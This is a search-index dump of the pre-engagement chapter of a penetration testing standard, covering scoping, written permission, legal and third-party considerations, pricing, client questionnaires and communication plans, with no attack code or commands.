Throughout the testing process it is critical to have regular meetings with the customer informing them of the overall progress of the test. These meetings should be held daily and should be as short as possible. Meetings should be kept to three concepts: plans, progress and problems. Plans are generally discussed so that testing is not conducted during a major unscheduled change or an outage. Progress is simply an update to the customer on what has been completed so far. Problems should also be discussed in this meeting, but in the interest of brevity, conversations concerning solutions should almost always be taken offline. Time of the Day to Test Certain customers require all testing to be done outside of business hours. This can mean late nights for most testers. The time of day requirements should be well established with the customer before testing begins. Dealing with Shunning There are times where shunning is perfectly acceptable and there are times where it may not fit the spirit of the test. For example, if your test is to be a full black-box test where you are testing not only the technology, but the capabilities of the target organization\u2019s security team, shunning would be perfectly fine. However, when you are testing a large number of systems in coordination with the target organization's security team it may not be in the best interests of the test to shun your attacks. Permission to Test One of the most important documents which need to be obtained for a penetration test is the Permission to Test document. This document states the scope and contains a signature which acknowledges awareness of the activities of the testers. Further, it should clearly state that testing can lead to system instability and all due care will be given by the tester to not crash systems in the process. However, because testing can lead to instability the customer shall not hold the tester liable for any system instability or crashes. It is critical that testing does not begin until this document is signed by the customer. In addition, some service providers require advance notice and/or separate permission prior to testing their systems. For example, Amazon has an online request form that must be completed, and the request must be approved before scanning any hosts on their cloud. If this is required, it should be part of the document. Legal Considerations Some activities common in penetration tests may violate local laws. For this reason, it is advised to check the legality of common pentest tasks in the location where the work is to be performed. For example,any VOIP calls captured in the course of the penetration test may be considered wiretapping in some areas. Capabilities and Technology in Place Good penetration tests do not simply check for un-patched systems. They also test the capabilities of the target organization. To that end, below is a list of things that you can benchmark while testing. Ability to detect and respond to information gathering Ability to detect and respond to foot printing Ability to detect and respond to scanning and vuln analysis Ability to detect and respond to infiltration (attacks) Ability to detect and respond to data aggregation Ability to detect and respond to data ex-filtration When tracking this information be sure to collect time information. For example, if a scan is detected you should be notified and note what level of scan you were preforming at the time.","title":"Pre engagement Interactions"},{"location":"pentest_standard/preengagemente/#overview","text":"The aim of this section of the PTES is to present and explain the tools and techniques available which aid in a successful pre-engagement step of a penetration test. The information within this section is the result of the many years of combined experience of some of the most successful penetration testers in the world. If you are a customer looking for penetration test we strongly recommend going to the General Questions section of this document. It covers the major questions that should be answered before a test begins. Remember, a penetration test should not be confrontational. It should not be an activity to see if the tester can \"hack\" you. It should be about identifying the business risk associated with and attack. To get maximum value, make sure the questions in this document are covered. Further, as the Scoping activity progresses, a good testing firm will start to ask additional questions tailored to your organization.","title":"Overview"},{"location":"pentest_standard/preengagemente/#introduction-to-scope","text":"Defining scope is arguably one of the most important components of a penetration test, yet it is also one of the most overlooked. While many volumes have been written about the different tools and techniques which can be utilized to gain access to a network, very little has been written on the topic which precedes the penetration: preparation. Neglecting to properly complete pre-engagement activities has the potential to open the penetration tester (or his firm) to a number of headaches including scope creep, unsatisfied customers, and even legal troubles. The scope of a project specifically defines what is to be tested. How each aspect of the test will be conducted will be covered in the Rules of Engagement section. One key component of scoping an engagement is outlining how the testers should spend their time. As an example, a customer requests that one hundred IP addresses be tested for the price of $100,000. This means that the customer is offering 1,000 per IP address tested. However, this cost structure only remains effective at that volume. A common trap some testers fall into is maintaining linear costs throughout the testing process. If the customer had only asked for one business-critical application to be tested at the same pricing structure ( 1,000 per IP address tested. However, this cost structure only remains effective at that volume. A common trap some testers fall into is maintaining linear costs throughout the testing process. If the customer had only asked for one business-critical application to be tested at the same pricing structure ( 1,000), while the tester will still be only attacking a single IP, the volume of work has increased dramatically. It is important to vary costs based on work done. Otherwise a firm can easily find themselves undercharging for their services, which motivates them to do a less than complete job. Despite having a solid pricing structure, the process is not all black and white. It is not uncommon for a client to be completely unaware of exactly what it is they need tested. It is also possible the client will not know how to communicate effectively what they\u2019re expecting from the test. It is important in the Pre-Engagement phase that the tester is able to serve as a guide through what may be uncharted territory for a customer. The tester must understand the difference between a test which focuses on a single application with severe intensity and a test where the client provides a wide range of IP addresses to test and the goal is to simply find a way in.","title":"Introduction to Scope"},{"location":"pentest_standard/preengagemente/#metrics-for-time-estimation","text":"Time estimations are directly tied to the experience of a tester in a certain area. If a tester has significant experience in a certain test, he will likely innately be able to determine how long a test will take. If the tester has less experience in the area, re-reading emails and scan logs from previous similar tests the firm has done is a great way to estimate the time requirement for the current engagement. Once the time to test is determined, it is a prudent practice to add 20% to the time. The extra 20% on the back end of the time value is called padding. Outside of consultant circles, this is also referred to as consultant overhead. The padding is an absolute necessity for any test. It provides a cushion should any interruptions occur in the testing. There are many events which commonly occur and hinder the testing process. For example, a network segment may go down, or a significant vulnerability may be found which requires many meetings with many levels of management to address. Both of these events are time consuming and would significantly impact the original time estimate if the padding was not in place. What happens if the 20% padding ends up not being necessary? Billing the client for time not worked would be extremely unethical, so it is up to the testers to provide additional value that may not normally have been provided if the engagement time limit had been hit. Examples include walking the company security team through the steps taken to exploit the vulnerability, provide an executive summary if it was not part of the original deliverable list, or spend some additional time trying to crack a vulnerability that was elusive during the initial testing. Another component of the metrics of time and testing is that every project needs to have a definitive drop dead date. All good projects have a well-defined beginning and end. You will need to have a signed statement of work specifying the work and the hours required if you\u2019ve reached the specific date the testing is to end, or if any additional testing or work is requested of you after that date. Some testers have a difficult time doing this because they feel they are being too much of a pain when it comes to cost and hours. However, it has been the experience of the author that if you provide exceptional value for the main test the customer will not balk at paying you for additional work.","title":"Metrics for Time Estimation"},{"location":"pentest_standard/preengagemente/#scoping-meeting","text":"In many cases the scoping meeting will occur after the contract has been signed. Situations do occur wherein many of the scope-related topics can be discussed before contract signing, but they are few and far between. For those situations it is recommended that a non-disclosure agreement be signed before any in-depth scoping discussions occur. The goal of the scoping meeting is to discuss what will be tested. Rules of engagement and costs will not be covered in this meeting. Each of these subjects should be handled in meetings where each piece is the focus of that meeting. This is done because discussions can easily become confused and muddled if focus is not explicitly stated. It is important to act as moderator and keep the discussions on-topic, preventing tangents and declaring certain topics more suited for off-line discussion when necessary. Now that a Rough Order of Magnitude (ROM) value has been established for the project it is time to have a meeting with the customer to validate assumptions. First, it needs to be established explicitly what IP ranges are in scope for the engagement. It is not uncommon for a client to be resistant and assume that it is the prerogative of the tester to identify their network and attack it, to make the test as realistic as possible. This would indeed be an ideal circumstance, however, possible legal ramifications must be considered above all else. Because of this, it is the responsibility of the tester to convey to a client these concerns and to impart upon them the importance of implicit scoping. For example, in the meeting, it should be verified that the customer owns all of the target environments including: the DNS server, the email server, the actual hardware their web servers run on and their firewall/IDS/IPS solution. There are a number of companies which will outsource the management of these devices to third parties. Additionally, the countries, provinces, and states in which the target environments operate in must be identified. Laws vary from region to region and the testing may very well be impacted by these laws. For instance, countries belonging to the European Union are well known to have very stringent laws surrounding the privacy of individuals, which can significantly change the manner in which a social engineering engagement would be executed.","title":"Scoping Meeting"},{"location":"pentest_standard/preengagemente/#additional-support-based-on-hourly-rate","text":"Anything that is not explicitly covered within the scope of the engagement should be handled very carefully. The first reason for this is scope creep. As the scope expands, file_suport are consumed, cutting into the profits for the tester and may even create confusion and anger on the part of the customer. There is another issue that many testers do not think of when taking on additional work on an ad-hoc basis: legal ramifications. Many ad-hoc requests are not properly documented so it can be difficult to determine who said what in the event of a dispute or legal action. Further, the contract is a legal document specifying the work that is to be done. It should be tightly tied to the permission to test memo. Any requests outside of the original scope should be documented in the form of a statement of work that clearly identifies the work to be done. We also recommend that it be clearly stated in the contract that additional work will be done for a flat fee per hour and explicitly state that additional work can not be completed until a signed and counter-signed SOW is in place.","title":"Additional Support Based on Hourly Rate"},{"location":"pentest_standard/preengagemente/#questionnaires","text":"During initial communications with the customer there are several questions which the client will have to answer in order for the engagement scope can be properly estimated. These questions are designed to provide a better understanding of what the client is looking to gain out of the penetration test, why the client is looking to have a penetration test performed against their environment, and whether or not they want certain types of tests performed during the penetration test. The following are sample questions which may be asked during this phase.","title":"Questionnaires"},{"location":"pentest_standard/preengagemente/#general-questions","text":"","title":"General Questions"},{"location":"pentest_standard/preengagemente/#network-penetration-test","text":"","title":"Network Penetration Test"},{"location":"pentest_standard/preengagemente/#why-is-the-customer-having-the-penetration-test-performed-against-their-environment","text":"","title":"Why is the customer having the penetration test performed against their environment?"},{"location":"pentest_standard/preengagemente/#is-the-penetration-test-required-for-a-specific-compliance-requirement","text":"","title":"Is the penetration test required for a specific compliance requirement?"},{"location":"pentest_standard/preengagemente/#when-does-the-customer-want-the-active-portions-scanning-enumeration-exploitation-etc-of-the-penetration-test-conducted","text":"","title":"When does the customer want the active portions (scanning, enumeration, exploitation, etc...) of the penetration test conducted?"},{"location":"pentest_standard/preengagemente/#during-business-hours","text":"","title":"During business hours?"},{"location":"pentest_standard/preengagemente/#after-business-hours","text":"","title":"After business hours?"},{"location":"pentest_standard/preengagemente/#on-the-weekends","text":"","title":"On the weekends?"},{"location":"pentest_standard/preengagemente/#how-many-total-ip-addresses-are-being-tested","text":"","title":"How many total IP addresses are being tested?"},{"location":"pentest_standard/preengagemente/#how-many-internal-ip-addresses-if-applicable","text":"","title":"How many internal IP addresses, if applicable?"},{"location":"pentest_standard/preengagemente/#how-many-external-ip-addresses-if-applicable","text":"","title":"How many external IP addresses, if applicable?"},{"location":"pentest_standard/preengagemente/#are-there-any-devices-in-place-that-may-impact-the-results-of-a-penetration-test-such-as-a-firewall-intrusion-detectionprevention-system-web-application-firewall-or-load-balancer","text":"","title":"Are there any devices in place that may impact the results of a penetration test such as a firewall, intrusion detection/prevention system, web application firewall, or load balancer?"},{"location":"pentest_standard/preengagemente/#in-the-case-that-a-system-is-penetrated-how-should-the-testing-team-proceed","text":"","title":"In the case that a system is penetrated, how should the testing team proceed?"},{"location":"pentest_standard/preengagemente/#perform-a-local-vulnerability-assessment-on-the-compromised-machine","text":"","title":"Perform a local vulnerability assessment on the compromised machine?"},{"location":"pentest_standard/preengagemente/#attempt-to-gain-the-highest-privileges-root-on-unix-machines-system-or-administrator-on-windows-machines-on-the-compromised-machine","text":"","title":"Attempt to gain the highest privileges (root on Unix machines, SYSTEM or Administrator on Windows machines) on the compromised machine?"},{"location":"pentest_standard/preengagemente/#perform-no-minimal-dictionary-or-exhaustive-password-attacks-against-local-password-hashes-obtained-for-example-etcshadow-on-unix-machines","text":"","title":"Perform no, minimal, dictionary, or exhaustive password attacks against local password hashes obtained (for example, /etc/shadow on Unix machines)?"},{"location":"pentest_standard/preengagemente/#web-application-penetration-test","text":"","title":"Web Application Penetration Test"},{"location":"pentest_standard/preengagemente/#how-many-web-applications-are-being-assessed","text":"","title":"How many web applications are being assessed?"},{"location":"pentest_standard/preengagemente/#how-many-login-systems-are-being-assessed","text":"","title":"How many login systems are being assessed?"},{"location":"pentest_standard/preengagemente/#how-many-static-pages-are-being-assessed-approximate","text":"","title":"How many static pages are being assessed? (approximate)"},{"location":"pentest_standard/preengagemente/#how-many-dynamic-pages-are-being-assessed-approximate","text":"","title":"How many dynamic pages are being assessed? (approximate)"},{"location":"pentest_standard/preengagemente/#will-the-source-code-be-made-readily-available","text":"","title":"Will the source code be made readily available?"},{"location":"pentest_standard/preengagemente/#will-there-be-any-kind-of-documentation","text":"","title":"Will there be any kind of documentation?"},{"location":"pentest_standard/preengagemente/#if-yes-what-kind-of-documentation","text":"","title":"If yes, what kind of documentation?"},{"location":"pentest_standard/preengagemente/#will-static-analysis-be-performed-on-this-application","text":"","title":"Will static analysis be performed on this application?"},{"location":"pentest_standard/preengagemente/#does-the-client-want-fuzzing-performed-against-this-application","text":"","title":"Does the client want fuzzing performed against this application?"},{"location":"pentest_standard/preengagemente/#does-the-client-want-role-based-testing-performed-against-this-application","text":"","title":"Does the client want role-based testing performed against this application?"},{"location":"pentest_standard/preengagemente/#does-the-client-want-credentialed-scans-of-web-applications-performed","text":"","title":"Does the client want credentialed scans of web applications performed?"},{"location":"pentest_standard/preengagemente/#wireless-network-penetration-test","text":"","title":"Wireless Network Penetration Test"},{"location":"pentest_standard/preengagemente/#how-many-wireless-networks-are-in-place","text":"","title":"How many wireless networks are in place?"},{"location":"pentest_standard/preengagemente/#is-a-guest-wireless-network-used-if-so","text":"","title":"Is a guest wireless network used? If so:"},{"location":"pentest_standard/preengagemente/#does-the-guest-network-require-authentication","text":"","title":"Does the guest network require authentication?"},{"location":"pentest_standard/preengagemente/#what-type-of-encryption-is-used-on-the-wireless-networks","text":"","title":"What type of encryption is used on the wireless networks?"},{"location":"pentest_standard/preengagemente/#what-is-the-square-footage-of-coverage","text":"","title":"What is the square footage of coverage?"},{"location":"pentest_standard/preengagemente/#will-enumeration-of-rogue-devices-be-necessary","text":"","title":"Will enumeration of rogue devices be necessary?"},{"location":"pentest_standard/preengagemente/#will-the-team-be-assessing-wireless-attacks-against-clients","text":"","title":"Will the team be assessing wireless attacks against clients?"},{"location":"pentest_standard/preengagemente/#approximately-how-many-clients-will-be-using-the-wireless-network","text":"","title":"Approximately how many clients will be using the wireless network?"},{"location":"pentest_standard/preengagemente/#physical-penetration-test","text":"","title":"Physical Penetration Test"},{"location":"pentest_standard/preengagemente/#how-many-locations-are-being-assessed","text":"","title":"How many locations are being assessed?"},{"location":"pentest_standard/preengagemente/#is-this-physical-location-a-shared-facility-if-so","text":"","title":"Is this physical location a shared facility? If so:"},{"location":"pentest_standard/preengagemente/#how-many-floors-are-in-scope","text":"","title":"How many floors are in scope?"},{"location":"pentest_standard/preengagemente/#which-floors-are-in-scope","text":"","title":"Which floors are in scope?"},{"location":"pentest_standard/preengagemente/#are-there-any-security-guards-that-will-need-to-be-bypassed-if-so","text":"","title":"Are there any security guards that will need to be bypassed? If so:"},{"location":"pentest_standard/preengagemente/#are-the-security-guards-employed-through-a-3rd-party","text":"","title":"Are the security guards employed through a 3rd party?"},{"location":"pentest_standard/preengagemente/#are-they-armed","text":"","title":"Are they armed?"},{"location":"pentest_standard/preengagemente/#are-they-allowed-to-use-force","text":"","title":"Are they allowed to use force?"},{"location":"pentest_standard/preengagemente/#how-many-entrances-are-there-into-the-building","text":"","title":"How many entrances are there into the building?"},{"location":"pentest_standard/preengagemente/#is-the-use-of-lock-picks-or-bump-keys-allowed-also-consider-local-laws","text":"","title":"Is the use of lock picks or bump keys allowed? (also consider local laws)"},{"location":"pentest_standard/preengagemente/#is-the-purpose-of-this-test-to-verify-compliance-with-existing-policies-and-procedures-or-for-performing-an-audit","text":"","title":"Is the purpose of this test to verify compliance with existing policies and procedures or for performing an audit?"},{"location":"pentest_standard/preengagemente/#what-is-the-square-footage-of-the-area-in-scope","text":"","title":"What is the square footage of the area in scope?"},{"location":"pentest_standard/preengagemente/#are-all-physical-security-measures-documented","text":"","title":"Are all physical security measures documented?"},{"location":"pentest_standard/preengagemente/#are-video-cameras-being-used","text":"","title":"Are video cameras being used?"},{"location":"pentest_standard/preengagemente/#are-the-cameras-client-owned-if-so","text":"","title":"Are the cameras client-owned? If so:"},{"location":"pentest_standard/preengagemente/#should-the-team-attempt-to-gain-access-to-where-the-video-camera-data-is-stored","text":"","title":"Should the team attempt to gain access to where the video camera data is stored?"},{"location":"pentest_standard/preengagemente/#is-there-an-armed-alarm-system-being-used-if-so","text":"","title":"Is there an armed alarm system being used? If so:"},{"location":"pentest_standard/preengagemente/#is-the-alarm-a-silent-alarm","text":"","title":"Is the alarm a silent alarm?"},{"location":"pentest_standard/preengagemente/#is-the-alarm-triggered-by-motion","text":"","title":"Is the alarm triggered by motion?"},{"location":"pentest_standard/preengagemente/#is-the-alarm-triggered-by-opening-of-doors-and-windows","text":"","title":"Is the alarm triggered by opening of doors and windows?"},{"location":"pentest_standard/preengagemente/#social-engineering","text":"","title":"Social Engineering"},{"location":"pentest_standard/preengagemente/#does-the-client-have-a-list-of-email-addresses-they-would-like-a-social-engineering-attack-to-be-performed-against","text":"","title":"Does the client have a list of email addresses they would like a Social Engineering attack to be performed against?"},{"location":"pentest_standard/preengagemente/#does-the-client-have-a-list-of-phone-numbers-they-would-like-a-social-engineering-attack-to-be-performed-against","text":"","title":"Does the client have a list of phone numbers they would like a Social Engineering attack to be performed against?"},{"location":"pentest_standard/preengagemente/#is-social-engineering-for-the-purpose-of-gaining-unauthorized-physical-access-approved-if-so","text":"","title":"Is Social Engineering for the purpose of gaining unauthorized physical access approved? If so:"},{"location":"pentest_standard/preengagemente/#how-many-people-will-be-targeted","text":"It should be noted that as part of different levels of testing, the questions for Business Unit Managers, Systems Administrators, and Help Desk Personnel may not be required. However, in the case these questions are necessary, some sample questions can be found below.","title":"How many people will be targeted?"},{"location":"pentest_standard/preengagemente/#questions-for-business-unit-managers","text":"","title":"Questions for Business Unit Managers"},{"location":"pentest_standard/preengagemente/#is-the-manager-aware-that-a-test-is-about-to-be-performed","text":"","title":"Is the manager aware that a test is about to be performed?"},{"location":"pentest_standard/preengagemente/#what-is-the-main-datum-that-would-create-the-greatest-risk-to-the-organization-if-exposed-corrupted-or-deleted","text":"","title":"What is the main datum that would create the greatest risk to the organization if exposed, corrupted, or deleted?"},{"location":"pentest_standard/preengagemente/#are-testing-and-validation-procedures-to-verify-that-business-applications-are-functioning-properly-in-place","text":"","title":"Are testing and validation procedures to verify that business applications are functioning properly in place?"},{"location":"pentest_standard/preengagemente/#will-the-testers-have-access-to-the-quality-assurance-testing-procedures-from-when-the-application-was-first-developed","text":"","title":"Will the testers have access to the Quality Assurance testing procedures from when the application was first developed?"},{"location":"pentest_standard/preengagemente/#are-disaster-recovery-procedures-in-place-for-the-application-data","text":"","title":"Are Disaster Recovery Procedures in place for the application data?"},{"location":"pentest_standard/preengagemente/#questions-for-systems-administrators","text":"","title":"Questions for Systems Administrators"},{"location":"pentest_standard/preengagemente/#are-there-any-systems-which-could-be-characterized-as-fragile-systems-with-tendencies-to-crash-older-operating-systems-or-which-are-unpatched","text":"","title":"Are there any systems which could be characterized as fragile? (systems with tendencies to crash, older operating systems, or which are unpatched)"},{"location":"pentest_standard/preengagemente/#are-there-systems-on-the-network-which-the-client-does-not-own-that-may-require-additional-approval-to-test","text":"","title":"Are there systems on the network which the client does not own, that may require additional approval to test?"},{"location":"pentest_standard/preengagemente/#are-change-management-procedures-in-place","text":"","title":"Are Change Management procedures in place?"},{"location":"pentest_standard/preengagemente/#what-is-the-mean-time-to-repair-systems-outages","text":"","title":"What is the mean time to repair systems outages?"},{"location":"pentest_standard/preengagemente/#is-any-system-monitoring-software-in-place","text":"","title":"Is any system monitoring software in place?"},{"location":"pentest_standard/preengagemente/#what-are-the-most-critical-servers-and-applications","text":"","title":"What are the most critical servers and applications?"},{"location":"pentest_standard/preengagemente/#are-backups-tested-on-a-regular-basis","text":"","title":"Are backups tested on a regular basis?"},{"location":"pentest_standard/preengagemente/#when-was-the-last-time-the-backups-were-restored","text":"","title":"When was the last time the backups were restored?"},{"location":"pentest_standard/preengagemente/#scope-creep","text":"Scope creep is one of the most efficient ways to put a penetration testing firm out of business. The issue is that many companies and managers have little to no idea how to identify it, or how to react to it when it happens. There are a couple of things to remember when battling scope creep. First, if a customer is pleased with the work done on a particular engagement, it is very common for them to request additional work. Take this as a compliment, and do not hesitate to ask for additional funding to compensate for the extra time spent. If a customer refuses to pay for the extra work, it is almost never worth staying on to do that work. The second point is even more critical. When dealing with existing customers, take care to keep the prices lower. Taking advantage of a good situation by price gouging is a sure way to drive away repeat business. Take into consideration that prices can be lowered since the firm avoided the costs of acquiring the customer such as the formal RFP process and hunting for the customer itself. Further, the best source for future work is through existing customers. Treat them well and they will return.","title":"Scope Creep"},{"location":"pentest_standard/preengagemente/#specify-start-and-end-dates","text":"Another key component defeating scope creep is explicitly stating start and end dates. This allows the project to have definite end. One of the most common areas in which scope creep occurs is during retesting. Retesting always sounds like a good idea when going after a contract. It shows that the firm is caring and diligent, trying to make ensure that the customer is secure as possible. The problem begins when it is forgotten that the work is not paid for until it is completed. This includes retesting. To mitigate this risk, add a simple statement to the contract which mentions that all retesting must be done within a certain timeframe after the final report delivery. It then becomes the responsibility of the testers to spearhead the retesting effort. If the customer requests an extension, always allow this with the condition that payment be fulfilled at the originally specified date. Finally, and most importantly, perform a quality retest. Remember, the best source for future work is your existing customer base.","title":"Specify Start and End Dates"},{"location":"pentest_standard/preengagemente/#specify-ip-ranges-and-domains","text":"Before starting a penetration test, all targets must be identified. These targets should be obtained from the customer during the initial questionnaire phase. Targets can be given in the form of specific IP addresses, network ranges, or domain names by the customer. In some instances, the only target the customer provides is the name of the organization and expects the testers be able to identify the rest on their own. It is important to define if systems like firewalls and IDS/IPS or networking equipment that are between the tester and the final target are also part of the scope. Additional elements such as upstream providers, and other 3 rd party providers should be identified and defined whether they are in scope or not.","title":"Specify IP Ranges and Domains"},{"location":"pentest_standard/preengagemente/#validate-ranges","text":"It is imperative that before you start to attack the targets you validate that they are in fact owned by the customer you are performing the test against. Think of the legal consequences you may run into if you start attacking a machine and successfully penetrate it only to find out later down the line that the machine actually belongs to another organization (such as a hospital or government agency).","title":"Validate Ranges"},{"location":"pentest_standard/preengagemente/#dealing-with-third-parties","text":"There are a number of situations where an engagement will include testing a service or an application that is being hosted by a third party. This has become more prevalent in recent years as \u201ccloud\u201d services have become more popular. The most important thing to remember is that while permission may have been granted by the client, they do not speak for their third party providers. Thus, permission must be obtained from them as well in order to test the hosted systems. Failing to obtain the proper permissions brings with it, as always, the possibility of violating the law, which can cause endless headaches.","title":"Dealing with Third Parties"},{"location":"pentest_standard/preengagemente/#cloud-services","text":"The single biggest issue with testing cloud service is there is data from multiple different organizations stored on one physical medium. Often the security between these different data domains is very lax. The cloud services provider needs to be alerted to the testing and needs to acknowledge that the test is occurring and grant the testing organization permission to test. Further, there needs to be a direct security contact within the cloud service provider that can be contacted in the event that a security vulnerability is discovered which may impact the other cloud customers. Some cloud providers have specific procedures for penetration testers to follow, and may require request forms, scheduling or explicit permission from them before testing can begin.","title":"Cloud Services"},{"location":"pentest_standard/preengagemente/#isp","text":"Verify the ISP terms of service with the customer. In many commercial situations the ISP will have specific provisions for testing. Review these terms carefully before launching an attack. There are situations where ISPs will shun and block certain traffic which is considered malicious. The customer may approve this risk, but it must always be clearly communicated before beginning. Web Hosting As with all other third parties, the scope and timing of the test needs to be clearly communicated with the web hosting provider. Also, when communicating with the client, be sure to clearly articulate the test will only be in search of web vulnerabilities. The test will not uncover vulnerabilities in the underlying infrastructure which may still provide an avenue to compromise the application.","title":"ISP"},{"location":"pentest_standard/preengagemente/#mssps","text":"Managed Security Service Providers also may need to be notified of testing. Specifically, they will need to be notified when the systems and services that they own are to be tested. However, there are circumstances under which the MSSP would not be notified. If determining the actual response time of the MSSP is part of the test, it is certainly not in the best interest of the integrity of the test for the MSSP to be notified. As a general rule of thumb, any time a device or service explicitly owned by the MSSP is being tested they will need to be notified.","title":"MSSPs"},{"location":"pentest_standard/preengagemente/#countries-where-servers-are-hosted","text":"It is also in the best interests of the tester to verify the countries where servers are being housed. After you have validated the country, review the laws of the specific country before beginning testing. It should not be assumed that the firm\u2019s legal team will provide a complete synopsis of local laws for the testers. It should also not be assumed that the firm will take legal responsibility for any laws violated by its testers. It is the responsibility of each tester to verify the laws for each region they are testing in before they begin testing because it will be the tester who ultimately will have to answer for any transgressions.","title":"Countries Where Servers are Hosted"},{"location":"pentest_standard/preengagemente/#define-acceptable-social-engineering-pretexts","text":"Many organizations will want their security posture tested in a way which is aligned with current attacks. Social engineering and spear-phishing attacks are currently widely used by many attackers today. While most of the successful attacks use pretexts like sex, drugs, and rock and roll (porn, Viagra, and free iPods respectively) some of these pretexts may not be acceptable in a corporate environment. Be sure that any pretexts chosen for the test are approved in writing before testing is to begin.","title":"Define Acceptable Social Engineering Pretexts"},{"location":"pentest_standard/preengagemente/#dos-testing","text":"Stress testing or Denial of Service testing should be discussed before the engagement begins. It can be a topic that many organizations are uncomfortable with due to the potentially damaging nature of the testing. If an organization is only worried about the confidentiality or integrity of their data, stress testing may not be necessary; however, if the organization is also worried about the availability of their services, then the stress testing should be conducted in a non-production environment which is identical to the production environment.","title":"DoS Testing"},{"location":"pentest_standard/preengagemente/#payment-terms","text":"Another aspect of preparing for a test that many testers completely forget about is how they should be paid. Just like contract dates there should be specific dates and terms for payments. It is not uncommon for larger organizations to delay payment for as long as possible. Below are a few common payment methods. These are simply examples. It is definitely recommended that each organization create and tweak their own pricing structure to more aptly suit the needs of their clients and themselves. The important thing is that some sort of structure be in place before testing begins.","title":"Payment Terms"},{"location":"pentest_standard/preengagemente/#net-30","text":"The total amount is due within 30 days of the delivery of the final report. This is usually associated with a per month percentage penalty for non-payment. This can be any number of days you wish to grant your customers (i.e. 45, or 60).","title":"Net 30"},{"location":"pentest_standard/preengagemente/#half-upfront","text":"It is not uncommon to require half of the total bill upfront before testing begins. This is very common for longer-term engagements.","title":"Half Upfront"},{"location":"pentest_standard/preengagemente/#recurring","text":"A recurring payment schedule is more commonly used for long-term engagements. For example, some engagements may span as far as a year or two. It is not at all uncommon to have the customer pay in regular installments throughout the year.","title":"Recurring"},{"location":"pentest_standard/preengagemente/#goals","text":"Every penetration test should be goal-oriented. This is to say that the purpose of the test is to identify specific vulnerabilities that lead to a compromise of the business or mission objectives of the customer. It is not about finding un-patched systems. It is about identifying risk that will adversely impact the organization.","title":"Goals"},{"location":"pentest_standard/preengagemente/#primary","text":"The primary goal of a test should not be driven by compliance. There are a number of different justifications for this reasoning. First, compliance does not equal security. While it should be understood that many organizations undergo testing because of compliance it should not be the main goal of the test. For example, a firm may be hired to complete a penetration test as part of PCI-DSS requirements. There is no shortage of companies which process credit card information. However, the traits which make the target organization unique and viable in a competitive market will have the greatest impact if compromised. Credit card systems being compromised would certainly be a serious issue, but credit cards numbers, along with all of the associated customer data being leaked would be catastrophic.","title":"Primary"},{"location":"pentest_standard/preengagemente/#secondary","text":"The secondary goals are directly related to compliance. It is not uncommon for primary and secondary goals to be very closely related. For example, in the example of the PCI-DSS driven test, getting the credit cards is the secondary goal. Tying that breach of data to the business or mission drivers of the organization is the primary goal. Secondary goals mean something for compliance and/or IT. Primary goals get the attention of upper management.","title":"Secondary"},{"location":"pentest_standard/preengagemente/#business-analysis","text":"Before performing a penetration test it is beneficial to determine the maturity level of the client\u2019s security posture. There are a number of organizations which choose to jump directly into a penetration test first assessing this maturity level. For customers with a very immature security program, it is often a good idea to perform a vulnerability analysis first. Some testers believe there is a stigma surrounding Vulnerability Analysis (VA) work. Those testers have forgotten that the goal is to identify risks in the target organization, not about pursuing the so-called \u201crockstar\u201d lifestyle. If a company is not ready for a full penetration test, they will get far more value out of a good VA than a penetration test. Establish with the customer in advance what information about the systems they will be providing. It may also be helpful to ask for information about vulnerabilities which are already documented. This will save the testers time and save the client money by not overlapping testing discoveries with known issues. Likewise, a full or partial white-box test may bring the customer more value than a black-box test, if it isn't absolutely required by compliance.","title":"Business Analysis"},{"location":"pentest_standard/preengagemente/#establish-lines-of-communication","text":"One of the most important aspects of any penetration test is communication with the customer. How often you interact with the customer, and the manner in which you approach them, can make a huge difference in their feeling of satisfaction. Below is a communication framework that will aid in making the customer feel comfortable about the test activities.","title":"Establish Lines of Communication"},{"location":"pentest_standard/preengagemente/#emergency-contact-information","text":"Obviously, being able to get in touch with the customer or target organization in an emergency is vital. Emergencies may arise, and a point of contact must have been established in order to handle them. Create an emergency contact list. This list should include contact information for all parties in the scope of testing. Once created, the emergency contact list should be shared with all those on the list. Keep in mind, the target organization may not be the customer. Gather the following information about each emergency contact:","title":"Emergency Contact Information"},{"location":"pentest_standard/preengagemente/#full-name","text":"","title":"Full name"},{"location":"pentest_standard/preengagemente/#title-and-operational-responsibility","text":"","title":"Title and operational responsibility"},{"location":"pentest_standard/preengagemente/#authorization-to-discuss-details-of-the-testing-activities-if-not-already-specified","text":"","title":"Authorization to discuss details of the testing activities, if not already specified"},{"location":"pentest_standard/preengagemente/#two-forms-of-247-immediate-contact-such-as-cell-phone-pager-or-home-phone-if-possible","text":"","title":"Two forms of 24/7 immediate contact, such as cell phone, pager, or home phone, if possible"},{"location":"pentest_standard/preengagemente/#one-form-of-secure-bulk-data-transfer-such-as-sftp-or-encrypted-email","text":"Note: The number for a group such as the help desk or operations center can replace one emergency contact, but only if it is staffed 24/7. The nature of each penetration test influences who should be on the emergency contact list. Not only will contact information for the customer and targets need to be made available, but they may also need to contact the testers in an emergency. The list should preferably include the following people:","title":"One form of secure bulk data transfer, such as SFTP or encrypted email"},{"location":"pentest_standard/preengagemente/#all-penetration-testers-in-the-test-group-for-the-engagement","text":"","title":"All penetration testers in the test group for the engagement"},{"location":"pentest_standard/preengagemente/#the-manager-of-the-test-group","text":"","title":"The manager of the test group"},{"location":"pentest_standard/preengagemente/#two-technical-contacts-at-each-target-organization","text":"","title":"Two technical contacts at each target organization"},{"location":"pentest_standard/preengagemente/#two-technical-contacts-at-the-customer","text":"","title":"Two technical contacts at the customer"},{"location":"pentest_standard/preengagemente/#one-upper-management-or-business-contact-at-the-customer","text":"It is possible that there will be some overlap in the above list. For instance, the target organization may be the customer, the test group\u2019s manager may also be performing the penetration test, or a customer\u2019s technical contact may be in upper management. It is also recommended to define a single contact person per involved party who leads it and takes responsibility on behalf of it.","title":"One upper management or business contact at the customer"},{"location":"pentest_standard/preengagemente/#incident-reporting-process","text":"Discussing the organization\u2019s current incident response capabilities is important to do before an engagement for several reasons. Part of a penetration test is not only testing the security an organization has in place, but also their incident response capabilities. If an entire engagement can be completed without the target\u2019s internal security teams ever noticing, a major gap in security posture has been identified. It is also important to ensure that before testing begins, someone at the target organization is aware of when the tests are being conducted so the incident response team does not start to call every member of upper management in the middle of the night because they thought they were under attack or compromised.","title":"Incident Reporting Process"},{"location":"pentest_standard/preengagemente/#incident-definition","text":"The National Institute of Standards and Technology (NIST) defines an incident as follows: \u201ca violation or imminent threat of violation of computer security policies, acceptable use policies, or standard security practices.\u201d (Computer Security Incident Handling Guide - Special Publication 800-61 Rev 1). An incident can also occur on a physical level, wherein a person gain unauthorized physical access to an area by any means. The target organization should have different 